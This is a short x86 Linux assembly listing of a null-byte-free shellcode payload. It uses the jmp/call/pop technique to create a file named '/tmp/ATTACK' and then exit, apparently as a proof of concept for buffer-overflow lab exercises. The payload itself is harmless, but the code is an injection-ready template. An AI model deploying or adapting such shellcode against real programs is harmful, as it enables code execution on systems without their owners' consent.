#include <sys/syscall.h>

#define STRING "/tmp/ATTACK"
#define STRLEN 11

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */

        movb    $SYS_creat,%al          /* syscall arg 1: syscall number */
        movl    %esi,%ebx               /* syscall arg 2: string pathname */
        movl    $0xffffffff,%ecx        /* syscall arg 3: mode */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
